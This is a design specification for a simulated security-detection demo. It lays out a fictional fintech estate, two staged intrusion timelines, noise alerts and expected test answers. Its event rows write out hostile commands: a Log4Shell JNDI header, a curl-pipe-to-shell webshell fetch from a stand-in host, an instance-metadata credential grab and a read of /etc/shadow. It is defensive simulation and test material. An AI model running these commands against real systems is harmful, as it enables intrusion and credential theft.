# Storyline and Ground Truth (build contract)

This document is the single source of truth for the simulated estate, the two intrusions, the background noise, and the answers the demo must produce. Every generator (cloud, EDR, cloud audit, threat intel) and every scenario test reads from this contract. If a detail is not specified here, a generator may invent it deterministically from the seed, but it must not contradict anything here.

All companies, people, actors, campaigns, malware, domains, hashes, and IP addresses are fictional. External IPs use the documentation ranges 203.0.113.0/24 and 198.51.100.0/24. Hashes are synthetic SHA-256 strings. CVE-2021-44228 is a real identifier used for realism; the attribution to "Hollow Tide" is fictional.

Simulation clock: **NOW = 2026-09-11T14:00:00Z**. Relative times below are exact and the generators must use them verbatim. Seed for all randomness: `THROUGHLINE_SEED = 20260911`.

Node ID convention (see 03-graph-schema.md): `<type>:<namespace>:<natural-key>`, all lowercase type, e.g. `vm:aws:i-0b4571e2c9a8f3d01`, `alert:falcon:ldt-a008`, `role:aws:111111111111:LarkspurBastionSSMRole`. IDs listed here are canonical and must be produced exactly.

---

## 1. Customer estate: Larkspur Financial

Mid-size fintech (~1,400 employees): consumer wallet, card issuing, banking-as-a-service API. Corporate identity provider is Okta (`corp.larkspur.example`). EDR is a Falcon-style sensor fleet. Cloud posture is a Wiz-style inventory. Cloud audit events are CloudTrail-style.

### 1.1 Cloud accounts

| Account / project | Provider | ID | Purpose | Environment |
|---|---|---|---|---|
| larkspur-prod | AWS | 111111111111 | Wallet API, card issuing, statement rendering, cardholder data | prod |
| larkspur-shared-services | AWS | 222222222222 | Bastions, CI/CD, monitoring, VPN, artifact registry | prod |
| larkspur-staging | AWS | 333333333333 | Pre-production copies of prod services | staging |
| larkspur-dev-sandbox | AWS | 444444444444 | Developer experiments, throwaway instances | dev |
| larkspur-data-platform | AWS | 555555555555 | Data lake, warehouse, analytics jobs (PII) | prod |
| larkspur-corp-it | AWS | 666666666666 | Corporate IT: marketing site, intranet tooling, Okta integrations | corp |
| larkspur-ml-fraud | GCP | project `larkspur-ml-fraud` | Fraud-model training, BigQuery datasets (PII) | prod |
| larkspur-corp-azure | Azure | subscription `7a1c...` (generator picks) | Entra-connected corp services, a few VMs | corp |

Node IDs: `account:aws:111111111111`, `account:gcp:larkspur-ml-fraud`, `account:azure:<subscription-id>`.

### 1.2 Named resources that the storyline depends on (must exist exactly)

| Node ID | Label | Key properties |
|---|---|---|
| `vm:aws:i-0b4571e2c9a8f3d01` | VirtualMachine | name `bas-01`, hostname `bas-01.shared.larkspur.internal`, private IP `10.20.0.15`, public IP `198.51.100.10` (SSH restricted to VPN CIDR `10.99.0.0/16`, so **not** internet-exposed), OS `Amazon Linux 2023`, account 222222222222, subnet `subnet:aws:subnet-0shared-mgmt-a`, tags `{role: bastion, owner: platform-eng, env: prod}`, instance profile role `role:aws:222222222222:LarkspurBastionSSMRole` |
| `role:aws:222222222222:LarkspurBastionSSMRole` | IamRole | instance role for bas-01; policies: SSM core, `LarkspurBastionAssumeProdReader` (allows `sts:AssumeRole` on the prod reader role), `LarkspurSharedLogsWrite` |
| `role:aws:111111111111:LarkspurProdDataReader` | IamRole | trust policy allows `arn:aws:iam::222222222222:role/LarkspurBastionSSMRole`; policies grant `s3:GetObject`, `s3:ListBucket` on `larkspur-cardholder-vault` and `larkspur-kyc-documents`, `secretsmanager:GetSecretValue` on `prod/cardholder-db/reader` and `prod/hsm/partner-signing-key`, `rds:DescribeDBInstances` |
| `bucket:aws:larkspur-cardholder-vault` | StorageBucket | account 111111111111, `data_classifications: [PCI]`, `sensitivity: critical`, `crown_jewel: true`, encrypted, not public, ~4.1 TB, application `app:larkspur:card-issuing` |
| `bucket:aws:larkspur-kyc-documents` | StorageBucket | account 111111111111, `[PII]`, `sensitivity: high`, `crown_jewel: true` |
| `secret:aws:111111111111:prod/cardholder-db/reader` | Secret | DB reader credentials for `database:aws:111111111111:cardholder-db` |
| `secret:aws:111111111111:prod/hsm/partner-signing-key` | Secret | partner signing key, `sensitivity: critical` |
| `database:aws:111111111111:cardholder-db` | Database | RDS PostgreSQL, `[PCI]`, `sensitivity: critical`, `crown_jewel: true`, not public |
| `vm:aws:i-0edge2a7f19c4b3e88` | VirtualMachine | name `stmt-render-2a`, hostname `stmt-render-2a.prod.larkspur.internal`, private IP `10.10.3.24`, public IP `198.51.100.24`, OS `Ubuntu 22.04`, account 111111111111, security group `sg:aws:sg-0edge-public-8080` allowing `0.0.0.0/0` on TCP 8080 (**internet-exposed**), instance profile `role:aws:111111111111:LarkspurStmtRenderRole`, application `app:larkspur:statement-render` |
| `role:aws:111111111111:LarkspurStmtRenderRole` | IamRole | grants `s3:GetObject` on `bucket:aws:larkspur-prod-app-config` and `s3:PutObject` on `bucket:aws:larkspur-statements-out` |
| `bucket:aws:larkspur-prod-app-config` | StorageBucket | `data_classifications: [SECRETS]`, `sensitivity: high`, contains `db-connection.yaml` with credentials for `cardholder-db` (represent as property `contains_credentials_for: ["database:aws:111111111111:cardholder-db"]`) |
| `package:aws:i-0edge2a7f19c4b3e88:log4j-core:2.14.1` | Package | `log4j-core 2.14.1` installed on stmt-render-2a (also as a component of image `image:ecr:larkspur/statement-render:3.8.1`) |
| `cve:CVE-2021-44228` | Vulnerability | CVSS 10.0, EPSS 0.97, KEV true, `exploitation_status: mass_exploitation` (set by TI enrichment) |
| `bucket:aws:larkspur-marketing-assets` | StorageBucket | account 666666666666, `public: true`, `data_classifications: [PUBLIC]`, `sensitivity: none`, static website assets, application `app:larkspur:marketing-site` |
| `vm:aws:i-0dev7c1a2b3c4d5e6f` | VirtualMachine | name `dev-sandbox-runner-03`, account 444444444444, no instance role, isolated subnet, no data path |
| `vm:aws:i-0scan9f8e7d6c5b4a3` | VirtualMachine | name `vulnscan-01`, private IP `10.20.5.9`, account 222222222222, tag `{role: vulnerability-scanner}` |
| `vm:aws:i-0file1a2b3c4d5e6f7` | VirtualMachine | name `srv-fileshare-01`, Windows Server 2022, account 666666666666 |
| `endpoint:falcon:aid-wks3391` | Endpoint | hostname `WKS-3391`, Windows 11, private IP `10.40.12.77`, site `Boston office`, primary user `user:okta:dwhitfield` |
| `endpoint:falcon:aid-bas01` | Endpoint | hostname `bas-01`, Linux sensor, cloud metadata `{provider: aws, instance_id: i-0b4571e2c9a8f3d01, account: 222222222222}` -> resolves `SAME_AS` -> `vm:aws:i-0b4571e2c9a8f3d01` (confidence 0.99, method `instance_id`) |
| `endpoint:falcon:aid-edge2a` | Endpoint | hostname `stmt-render-2a`, Linux sensor, cloud metadata instance `i-0edge2a7f19c4b3e88` -> `SAME_AS` -> `vm:aws:i-0edge2a7f19c4b3e88` |
| `endpoint:falcon:aid-devrun03` | Endpoint | hostname `dev-sandbox-runner-03` -> `SAME_AS` -> `vm:aws:i-0dev7c1a2b3c4d5e6f` |
| `endpoint:falcon:aid-file01` | Endpoint | hostname `srv-fileshare-01` -> `SAME_AS` -> `vm:aws:i-0file1a2b3c4d5e6f7` |
| `endpoint:falcon:aid-wks2210` | Endpoint | hostname `WKS-2210`, primary user `user:okta:mreyes` (IT admin) |
| `endpoint:falcon:aid-wks1042` | Endpoint | hostname `WKS-1042`, macOS, primary user `user:okta:pkaur` (CFO) |

Every other cloud VM that carries an EDR sensor also gets an `Endpoint` node with a `SAME_AS` edge; about 90% of cloud Linux/Windows VMs have sensors (EKS nodes included), none of the serverless functions do, and a handful of prod VMs intentionally have **no sensor** (coverage gap the dashboard can show).

### 1.3 People and identities that matter

| Node ID | Label | Details |
|---|---|---|
| `user:okta:dwhitfield` | HumanUser | Dana Whitfield, Treasury Operations analyst, Finance, Boston. Groups: `group:okta:finance-treasury`, `group:okta:all-employees`. Has legitimate SFTP access to bas-01 as `svc-finops-sftp` to pull settlement files. |
| `identity:linux:svc-finops-sftp` | ServiceAccount | Local service account on bas-01 used for settlement-file SFTP; authorized key is Dana's `id_ed25519` |
| `user:okta:mreyes` | HumanUser | Marcus Reyes, IT systems administrator, Corp IT. Maps to `role:aws:666666666666:LarkspurCorpItAdmin` via SSO |
| `user:okta:pkaur` | HumanUser | Priya Kaur, CFO. Exec. |
| `user:okta:jokafor` | HumanUser | Jide Okafor, Platform engineering lead; owner of bas-01 and shared-services |
| `user:okta:lchen` | HumanUser | Lin Chen, Statement-render service owner (Payments Platform team) |
| `team:larkspur:platform-eng` | Team | owns shared-services, bastions |
| `team:larkspur:payments-platform` | Team | owns card-issuing, statement-render |
| `team:larkspur:finance-treasury` | Team | Dana's team |
| `team:larkspur:corp-it` | Team | Marcus's team |
| `app:larkspur:card-issuing` | Application | criticality `tier-0`, owns cardholder vault + cardholder-db |
| `app:larkspur:statement-render` | Application | criticality `tier-1` |
| `app:larkspur:marketing-site` | Application | criticality `tier-3` |

Every other human user is generated: ~1,400 users across ~18 teams, each with one workstation, realistic department distribution (Engineering 35%, Operations 20%, Finance 8%, Sales/Marketing 12%, Compliance/Risk 8%, Support 12%, Exec/Other 5%).

---

## 2. Campaign A: EMBERCAST by Cinder Jackal (targeted intrusion)

Fictional eCrime actor **Cinder Jackal** (`actor:ti:cinder-jackal`), campaign **EMBERCAST** (`campaign:ti:embercast`, active since 2026-07). Motivation: financial; targets fintech and payment processors in North America and Western Europe (`sector_targeting_relevance` for Larkspur = 0.9). Malware:

| Node ID | Malware | Role |
|---|---|---|
| `malware:ti:mapleloader` | MAPLELOADER | ISO/LNK-delivered loader (DLL run via rundll32) |
| `malware:ti:quilldrop` | QUILLDROP | credential stealer (LSASS memory, browser stores, SSH keys) |
| `malware:ti:nightferry` | NIGHTFERRY | HTTPS C2 implant, persistence via Run key |

Indicators (all fictional):

| Node ID | Type | Value | Confidence | Indicates |
|---|---|---|---|---|
| `ioc:domain:cdn-metrics.telemetry-sync.net` | domain | `cdn-metrics.telemetry-sync.net` | 0.95 | nightferry, embercast |
| `ioc:ipv4:203.0.113.42` | ipv4 | `203.0.113.42` | 0.9 | nightferry C2 |
| `ioc:ipv4:203.0.113.77` | ipv4 | `203.0.113.77` | 0.85 | Cinder Jackal cloud-abuse egress (ASN AS64500 "Stratovault Hosting", fictional) |
| `ioc:sha256:mapleloader` | sha256 | `8f2c1a9e4b7d3f60c5e8a1b2d4f6c7e9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5` | 0.95 | mapleloader |
| `ioc:sha256:quilldrop` | sha256 | `3b9d7e1f5a2c8b4d6e0f9a1c3b5d7e9f2a4c6e8b0d1f3a5c7e9b1d3f5a7c9e1b` | 0.9 | quilldrop |
| `ioc:sha256:nightferry` | sha256 | `c4e2a6b8d0f1e3a5c7b9d1f3e5a7c9b1d3f5e7a9c1b3d5f7e9a1c3b5d7f9e1a3` | 0.95 | nightferry |
| `ioc:filename:synchost.exe` | filename | `synchost.exe` in `C:\ProgramData\Microsoft\SyncHost\` | 0.6 | nightferry |

Techniques used by the actor (ATT&CK IDs, `technique:attack:<id>`): T1566.001, T1204.002, T1059.001, T1218.011, T1055, T1547.001, T1071.001, T1573.002, T1003.001, T1552.001, T1087.002, T1018, T1021.004, T1078, T1003.008, T1552.005, T1078.004, T1580, T1548.005, T1530, T1567.002.

Intel report: `report:ti:TL-2026-0142` "EMBERCAST: Cinder Jackal shifts to bastion-host pivoting against fintech cloud estates" published 2026-09-02 by the fictional research team "Throughline Labs", confidence high. It lists the IOCs above, the TTPs, and states the actor is *actively* operating.

### 2.1 Timeline (exact)

Attacker egress IP for interactive activity: `203.0.113.77`. C2: `cdn-metrics.telemetry-sync.net` -> `203.0.113.42:443`.

| # | Time (UTC) | Host / principal | Event | Alert produced |
|---|---|---|---|---|
| A0 | 2026-09-09 08:47 | WKS-3391 (dwhitfield) | Phishing email "Q3 remittance reconciliation" with `Invoice_Q3_Remittance.iso` | none (mail gateway passed it) |
| A1 | 2026-09-09 09:12:04 | WKS-3391 | `explorer.exe` mounts ISO; user opens `Remittance_Viewer.lnk` -> `powershell.exe -w hidden -enc ...` -> `rundll32.exe C:\Users\dwhitfield\AppData\Local\Temp\mpl.dll,Start` (MAPLELOADER, hash `ioc:sha256:mapleloader`) | **`alert:falcon:ldt-a001`** High. Title "Malicious file execution via LNK in mounted ISO". Techniques T1566.001, T1204.002, T1059.001, T1218.011 |
| A2 | 2026-09-09 09:14:30 | WKS-3391 | MAPLELOADER writes `C:\ProgramData\Microsoft\SyncHost\synchost.exe` (NIGHTFERRY, hash `ioc:sha256:nightferry`), sets `HKCU\...\Run\SyncHost`, injects into `explorer.exe` | `alert:falcon:ldt-a002` Medium. "Run-key persistence by recently written binary" T1547.001, T1055 |
| A3 | 2026-09-09 09:15:00 then every 300 s | WKS-3391 `synchost.exe` | HTTPS beacons to `cdn-metrics.telemetry-sync.net` (`203.0.113.42:443`) | `alert:falcon:ldt-a003` Medium at 11:40:00. "Periodic outbound connections to rare domain" T1071.001, T1573.002. (The EDR does **not** know the domain is an IOC; only TI enrichment matches it.) |
| A4 | 2026-09-09 15:22:41 | WKS-3391 | QUILLDROP (`C:\Users\dwhitfield\AppData\Local\Temp\qd.exe`, hash `ioc:sha256:quilldrop`) opens `lsass.exe` with PROCESS_VM_READ, dumps memory | `alert:falcon:ldt-a004` Medium. "Credential dumping technique observed (LSASS memory read)" T1003.001 |
| A5 | 2026-09-09 15:31:10 | WKS-3391 | Reads `C:\Users\dwhitfield\.ssh\id_ed25519` and `C:\Users\dwhitfield\AppData\Roaming\FinOpsSync\config.ini` (contains `host=bas-01.shared.larkspur.internal user=svc-finops-sftp`) | `alert:falcon:ldt-a005` Low. "Access to SSH private key by unsigned process" T1552.001. Creates node `credential:ssh:dwhitfield-id_ed25519` (type ssh_private_key, `credential_for` -> `identity:linux:svc-finops-sftp`) with edge STOLEN_BY from the alert/process |
| A6 | 2026-09-09 15:40-16:10 | WKS-3391 | Discovery: `net group "Domain Admins" /domain`, `nltest /dclist:corp`, `arp -a`, `nslookup bas-01.shared.larkspur.internal` | `alert:falcon:ldt-a006` Informational. "Account and remote-system discovery" T1087.002, T1018 |
| A7 | 2026-09-10 02:05:17 | WKS-3391 -> bas-01 | SSH from `10.40.12.77` to `10.20.0.15:22`, key auth as `svc-finops-sftp`, then interactive shell (never happens for the SFTP-only account) | `alert:falcon:ldt-a007` Medium on **bas-01**. "Interactive SSH session from user workstation to bastion outside business hours" T1021.004, T1078. Edge `LATERAL_MOVEMENT_TO` WKS-3391 -> bas-01 (protocol ssh, account svc-finops-sftp, time A7) |
| A8 | 2026-09-10 02:09:02 | bas-01 | `sudo -l` (misconfigured NOPASSWD), `cat /etc/shadow` | `alert:falcon:ldt-a008x` Low. "Read of /etc/shadow via sudo" T1003.008 |
| **A9** | **2026-09-10 02:11:45** | **bas-01** | `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/LarkspurBastionSSMRole` from the interactive shell; response contains temporary keys `ASIA5LARKBASTION01Q7` | **`alert:falcon:ldt-a009`** **Medium**. "Cloud instance metadata service credential access from interactive shell" T1552.005. **This is the pivotal alert.** Creates node `credential:aws:ASIA5LARKBASTION01Q7` (type aws_temporary_key, `credential_for` -> `role:aws:222222222222:LarkspurBastionSSMRole`, expires 2026-09-10 08:11) with STOLEN_BY from this alert |
| A10 | 2026-09-10 02:20:31 | key ASIA5LARKBASTION01Q7 from `203.0.113.77` | `sts:GetCallerIdentity` | `cloudevent:aws:evt-a010` (success). Later matched: credentials for an instance role used from outside the VPC/AWS |
| A11 | 2026-09-10 02:21:02 | same | `s3:ListAllMyBuckets` (AccessDenied) then `iam:ListRoles` (AccessDenied) | `cloudevent:aws:evt-a011` (denied, aggregated count 2) |
| A12 | 2026-09-10 02:24:15 | same | `sts:AssumeRole` -> `arn:aws:iam::111111111111:role/LarkspurProdDataReader`, session `ember-sync` -> new key `ASIA5LARKPRODREADER1` | `cloudevent:aws:evt-a012` (success). Creates `credential:aws:ASIA5LARKPRODREADER1` (`credential_for` -> prod reader role, `derived_from` -> `credential:aws:ASIA5LARKBASTION01Q7`) |
| A13 | 2026-09-10 02:26:00 - 03:40:00 | ASIA5LARKPRODREADER1 from `203.0.113.77` | `s3:ListBucket` then `s3:GetObject` x 1,247 on `larkspur-cardholder-vault` (~38 GB) | `cloudevent:aws:evt-a013` (ListBucket), `cloudevent:aws:evt-a014` (GetObject, count 1247, bytes 38_400_000_000) |
| A14 | 2026-09-10 03:41:12 | same | `secretsmanager:GetSecretValue` on `prod/cardholder-db/reader` and `prod/hsm/partner-signing-key` | `cloudevent:aws:evt-a015`, `cloudevent:aws:evt-a016` |
| A15 | 2026-09-10 03:55:00 | cloud anomaly detector | Low-severity cloud alert: "API calls for role LarkspurProdDataReader from a new geolocation/ASN" | `alert:cloud-anomaly:ca-a017` **Low**. Flat view: looks like a VPN/travel anomaly. Involves `credential:aws:ASIA5LARKPRODREADER1`, ip `203.0.113.77` |

Incident grouping in the EDR console (flat view): the EDR groups only `ldt-a001..a006` into `incident:falcon:inc-0091` on WKS-3391 and separately `ldt-a007, a008x, a009` into `incident:falcon:inc-0094` on bas-01. It does not connect them (different hosts, different users). The cloud events and the cloud-anomaly alert are not in any EDR incident. Throughline's correlation must produce a single storyline: `storyline:derived:embercast-larkspur` linking all of A1-A15.

### 2.2 What the graph must reveal (ground truth for tests)

- `alert:falcon:ldt-a009` sits on `endpoint:falcon:aid-bas01` which is `SAME_AS` `vm:aws:i-0b4571e2c9a8f3d01`, which `HAS_ROLE` `LarkspurBastionSSMRole`, which `CAN_ASSUME` `LarkspurProdDataReader`, which `CAN_ACCESS` (read) `bucket:aws:larkspur-cardholder-vault` (PCI), `bucket:aws:larkspur-kyc-documents` (PII), `secret:...prod/cardholder-db/reader`, `secret:...prod/hsm/partner-signing-key`, and via the DB reader secret can reach `database:aws:111111111111:cardholder-db`. Blast radius from ldt-a009 therefore contains 2 crown-jewel buckets, 2 secrets, 1 crown-jewel database. Shortest path Alert -> PCI bucket is 5 hops (Alert -ON_ENDPOINT-> Endpoint -SAME_AS-> VM -HAS_ROLE-> Role -CAN_ASSUME-> Role -CAN_ACCESS-> Bucket).
- The **credential join**: `credential:aws:ASIA5LARKBASTION01Q7` was STOLEN_BY ldt-a009 (endpoint) and USED_BY cloudevents evt-a010..a012 (cloud). `credential:aws:ASIA5LARKPRODREADER1` is DERIVED_FROM it and USED_BY evt-a013..a016. Question 8 answer = exactly these two credentials.
- The C2 domain `cdn-metrics.telemetry-sync.net` contacted by the process in ldt-a003 `MATCHES_IOC` `ioc:domain:cdn-metrics.telemetry-sync.net` -> `INDICATES` `malware:ti:nightferry` -> `campaign:ti:embercast` -> `actor:ti:cinder-jackal`. Hashes in ldt-a001/a002/a004 match the three malware IOCs. `203.0.113.77` used in evt-a010..a016 and ca-a017 matches `ioc:ipv4:203.0.113.77`.
- Full attack path for question 7: ldt-a001 (WKS-3391) -> lateral movement -> bas-01 -> role -> prod role -> cardholder vault. 7 stages, techniques as listed.
- Contextual score for `ldt-a009` must be >= 90 (Critical, rank #1 overall). `ldt-a001` (vendor High) also lands >= 85 because it is on the same storyline. `ca-a017` (vendor Low) lands >= 85 because it is on the storyline and touches PCI.
- Containment simulation (question 12): isolating `bas-01` cuts the path for storyline A and breaks: settlement-file SFTP for Finance Treasury (`app:larkspur:settlement-sftp`, tier-2) and SSM access for platform engineering; rotating `LarkspurBastionSSMRole` credentials invalidates `ASIA5LARKBASTION01Q7` but **not** the already-issued `ASIA5LARKPRODREADER1` (expires 2026-09-10 03:24 + 1h session => already expired by NOW; say so). Rotating the prod reader role's trust policy is also required.

---

## 3. Campaign B: SALTWORKS by Hollow Tide (opportunistic mass exploitation)

Fictional access broker **Hollow Tide** (`actor:ti:hollow-tide`), campaign **SALTWORKS** (`campaign:ti:saltworks`, since 2026-08-20): mass scanning and exploitation of **CVE-2021-44228** on internet-facing Java services at financial-services companies, dropping the **BRACKISH** webshell (`malware:ti:brackish`) and selling access to ransomware affiliates. `sector_targeting_relevance` for Larkspur = 0.8. Intel report `report:ti:TL-2026-0147` "SALTWORKS: Hollow Tide mass-exploits Log4Shell in fintech statement and document services" published 2026-09-08, confidence medium-high. EXPLOITS edge: `campaign:ti:saltworks -[EXPLOITS {status: mass_exploitation, first_seen: 2026-08-20}]-> cve:CVE-2021-44228`.

Indicators: `ioc:ipv4:203.0.113.99` (scanner/exploit source and payload host, 0.8), `ioc:sha256:brackish` = `e7a1c3b5d7f9a1b3c5d7e9f1a3b5c7d9e1f3a5b7c9d1e3f5a7b9c1d3e5f7a9b1` (0.85), `ioc:url:http://203.0.113.99:8000/s/brackish.sh` (0.8).

| # | Time (UTC) | Host | Event | Alert |
|---|---|---|---|---|
| B1 | 2026-09-10 21:13:02 | stmt-render-2a (198.51.100.24:8080) | HTTP request with header `X-Api-Version: ${jndi:ldap://203.0.113.99:1389/o}` from `203.0.113.99` | `alert:waf:waf-b001` **Medium**. "JNDI injection pattern in request header". Source: WAF/IDS feed. Flat view: one of ~2,300 exploit-pattern alerts this week, mostly scanner noise |
| B2 | 2026-09-10 21:13:07 | stmt-render-2a | `java` (statement-render, pid 2211) spawns `/bin/bash -c "curl -s http://203.0.113.99:8000/s/brackish.sh \| sh"` | `alert:falcon:ldt-b002` **Medium**. "Shell spawned by Java application server process" T1190, T1059.004 |
| B3 | 2026-09-10 21:13:19 | stmt-render-2a | Writes `/opt/statement-render/webapps/ROOT/.b.jsp` (BRACKISH, hash `ioc:sha256:brackish`), chmod, touch -r to blend timestamps | `alert:falcon:ldt-b003` Low. "Web shell-like file written to web root" T1505.003 |
| B4 | 2026-09-10 21:14 - 21:30 | stmt-render-2a | Outbound connections to `203.0.113.99:8000` (payload) then quiet | part of ldt-b002 evidence (process CONNECTED_TO ip) |

No cloud API activity from `LarkspurStmtRenderRole` yet. The graph shows **potential** blast radius: role -> `bucket:aws:larkspur-prod-app-config` (secrets) -> credentials for `cardholder-db` -> PCI. The EDR groups ldt-b002 and ldt-b003 into `incident:falcon:inc-0096`. Throughline correlates waf-b001 + ldt-b002 + ldt-b003 + the SALTWORKS TI match into `storyline:derived:saltworks-larkspur`.

Ground truth: `alert:falcon:ldt-b002` contextual score in [78, 89] (High, rank #2 among storylines; the TI booster rail applies: active/mass exploitation and sector relevance >= 0.7). Question 5 answer must include `vm:aws:i-0edge2a7f19c4b3e88` first; the generator also adds **two more** internet-exposed hosts with the same CVE but lower context so the ranking is meaningful: `vm:aws:i-0stg4e5f6a7b8c9d0e1` (`stmt-render-stg-1`, staging, role can read only a staging config bucket, no crown jewels) and `vm:aws:i-0dev8f9e0d1c2b3a4f5` (`log4j-testbed`, dev-sandbox, no role). Plus **five** internet-exposed hosts with other actively exploited CVEs (from the TI catalog) so the question has a realistic result set (8 rows), ranked by contextual score.

---

## 4. Background noise (must exist so prioritization matters)

| Alert ID | Vendor severity | Where | What | Why it is noise / benign | Expected contextual score |
|---|---|---|---|---|---|
| `alert:falcon:ldt-n001` | High | `endpoint:falcon:aid-devrun03` (dev-sandbox-runner-03) | EICAR test file detected and quarantined | isolated dev VM, no role, no data path, no TI | <= 25 |
| `alert:cspm:iss-n002` | Critical | `bucket:aws:larkspur-marketing-assets` | "S3 bucket allows public read" | public marketing assets, classification PUBLIC, no actor interest, no privilege | <= 25 |
| `alert:falcon:ldt-n003` | Medium | `endpoint:falcon:aid-file01` (srv-fileshare-01) | PsExec service execution by `mreyes` at 2026-09-11 01:12 UTC, T1569.002 | inside approved change window `CHG-2026-0911-014` (property `change_ticket`), admin's own workstation WKS-2210 as source | <= 35 |
| `alert:okta:idp-n004` | Medium | `user:okta:pkaur` | Impossible travel: London 07:02 UTC then New York 07:48 UTC on 2026-09-11 | second login egress IP is the corporate VPN `198.51.100.200`; MFA satisfied | <= 30 |
| `alert:falcon:ldt-n005..n016` | Low | 12 random workstations | Quarantined malicious attachment, blocked pre-execution | blocked, no execution | <= 20 |
| `alert:ids:ids-n1xx` (about 120) | Low/Medium | many prod hosts | "Exploit attempt" signatures with source `10.20.5.9` (`vulnscan-01`) | source is the internal vulnerability scanner (tag) | <= 25 |
| `alert:waf:waf-nxxx` (about 400 aggregated) | Low/Medium | public endpoints | Generic scanner exploit patterns from many IPs (none in TI) against hosts that are patched | no matching vulnerability on target | <= 30 |
| general EDR detections (about 250) | Info-High | random endpoints | PUPs, suspicious PowerShell in IT scripts, macro warnings, LOLBin usage, a few true-positive commodity malware on workstations without privileged reach | mixture; a handful legitimately score 40-70 | 10-70 |
| general CSPM issues (about 600) | Low-Critical | random cloud resources | unencrypted volumes, keys > 90 days, MFA missing, SG open 22 to world on dev, public snapshots, over-permissive policies, outdated AMIs | mixture; a few toxic combinations should score 60-80 (e.g. internet-exposed prod VM with critical CVE and admin role) | 10-80 |

Critical requirement: after re-ranking, the top 3 alerts by contextual score must be `ldt-a009` (#1), then one of `ldt-a001`/`ca-a017` (same storyline), and `ldt-b002` must be the highest-scoring alert **not** in storyline A. `iss-n002` and `ldt-n001` must land in the bottom half despite Critical/High vendor severity. The dashboard shows both orderings side by side.

---

## 5. Threat intel catalog (beyond the two campaigns)

Ten fictional actors, sixteen campaigns, twelve malware families, thirty reports, roughly 400 indicators, and sixty CVEs with exploitation status. The generator must ensure:

- At least 6 CVEs present in the estate are marked `active` or `mass_exploitation` by some campaign, so question 5 and the "TI-adjusted exposure" panel have real results beyond Log4Shell. Suggested real identifiers for realism (fictional attribution): CVE-2023-4966, CVE-2024-3400, CVE-2023-22515, CVE-2024-21887, CVE-2023-46805, CVE-2022-22965. Everything else may be synthetic (`CVE-2026-9xxxx`) and should be labelled `synthetic: true`.
- Sector targeting: 4 actors target financial services (relevance >= 0.7), the others target healthcare, energy, public sector, and technology (relevance <= 0.3) so the sector filter visibly changes ranking.
- Every indicator carries `confidence`, `first_seen`, `last_seen`, `report_id`.
- IOC matches in the estate: besides the storyline matches, plant 5-8 low-confidence IOC matches (old campaigns, confidence <= 0.5) on random hosts so the TI page is not empty and the analyst can see confidence mattering.

---

## 6. Expected answers to the 12 demo questions (used by scenario tests)

| # | Question | Must contain | Must not contain |
|---|---|---|---|
| 1 | Everything connected to the credential-dumping alert on BAS-01, what can an attacker reach | ldt-a009, bas-01 endpoint and VM, LarkspurBastionSSMRole, LarkspurProdDataReader, cardholder-vault (PCI), kyc-documents (PII), both secrets, cardholder-db; blast radius count of crown jewels = 3 | marketing-assets bucket |
| 2 | Medium-severity endpoint alerts on assets with a path to regulated data | ldt-a009 (first), ldt-a007, ldt-b002 | ldt-n003 (PsExec on fileshare with no regulated data path), ldt-n001 |
| 3 | Is the cloud API activity from the bastion role related to any endpoint detection | evt-a010, evt-a012 linked to credential ASIA5LARKBASTION01Q7 stolen in ldt-a009 on bas-01 | |
| 4 | Blast radius of LarkspurBastionSSMRole | can assume LarkspurProdDataReader; reaches cardholder-vault, kyc-documents, 2 secrets, cardholder-db; also shared-services log bucket write | |
| 5 | Internet-exposed hosts with a vuln actively exploited against fintechs | stmt-render-2a first (Hollow Tide, SALTWORKS, CVE-2021-44228, mass_exploitation), then stmt-render-stg-1, log4j-testbed, then the five other CVE hosts | bas-01 (not internet-exposed) |
| 6 | Rank open alerts by contextual risk and explain the top 3 | ldt-a009 #1 with factor breakdown; storyline A alerts; ldt-b002 as top non-A alert | iss-n002 in top 10 |
| 7 | Full attack path from the phishing detection on WKS-3391 to regulated data | ldt-a001 -> WKS-3391 -> LATERAL_MOVEMENT_TO bas-01 -> VM -> BastionSSMRole -> ProdDataReader -> cardholder-vault; 7 stages with technique IDs | |
| 8 | Credentials used in cloud API calls that were seen stolen on an endpoint | ASIA5LARKBASTION01Q7 (stolen ldt-a009, used evt-a010..a012) and ASIA5LARKPRODREADER1 (derived, used evt-a013..a016) | any other credential |
| 9 | Detections matching IOCs/TTPs from the Cinder Jackal report | ldt-a001, a002, a003, a004 (hash/domain IOC matches), evt-a010..a016 + ca-a017 (IP match), TTP overlap count >= 10; touches cardholder-vault | Hollow Tide indicators |
| 10 | Only alerts on assets that can reach cardholder data | ldt-a007, ldt-a008x, ldt-a009, ca-a017, ldt-b002, ldt-b003, waf-b001 plus any generated alert on hosts whose roles reach the vault | ldt-n001, iss-n002, ldt-n003 |
| 11 | Is the "S3 bucket public" critical finding actually risky | classification PUBLIC, no sensitive data, no actor interest, no privilege reach, contextual <= 25, recommendation: low priority | |
| 12 | Isolate BAS-01 and rotate the bastion role: what is contained and what breaks | contains storyline A path; breaks settlement SFTP (finance-treasury) and SSM access for platform-eng; note that the prod reader session key is already expired and that the trust policy should be tightened | |

---

## 7. Scale targets for the generated estate

| Domain | Target counts |
|---|---|
| Cloud | 8 accounts, ~30 VPCs, ~90 subnets, ~150 security groups, ~25 load balancers, ~650 VMs (incl. ~120 EKS nodes across 3 clusters), ~260 workloads, ~120 serverless functions, ~180 buckets, ~40 databases, ~60 secrets, ~400 IAM roles, ~80 IAM users with ~100 access keys, ~300 policies, ~400 container images, ~2,500 package nodes, ~60 CVEs, ~3,000 VULNERABLE_TO edges |
| Business | ~45 applications, 18 teams, ~1,400 human users, ~60 groups |
| Endpoints | ~1,450 workstations + ~560 server endpoints (SAME_AS cloud VMs) = ~2,000 endpoints; ~6,000 process nodes (storyline process trees + samples for alerted detections), ~1,500 file nodes, ~800 external IPs/domains |
| Alerts | ~600 EDR detections, ~600 CSPM issues, ~400 WAF (aggregated), ~120 IDS, ~10 cloud-anomaly, ~10 identity-provider alerts; ~45 EDR incidents; 2 derived storylines |
| Threat intel | 10 actors, 16 campaigns, 12 malware, ~60 techniques, ~400 indicators, 30 reports |
| Cloud audit | ~2,500 aggregated CloudEvent nodes over 7 days (background API activity by roles and users), plus the storyline events |

Approximate totals: 20,000-30,000 nodes, 80,000-150,000 edges. Generation must finish in under 60 seconds and Kuzu load in under 90 seconds on a laptop.
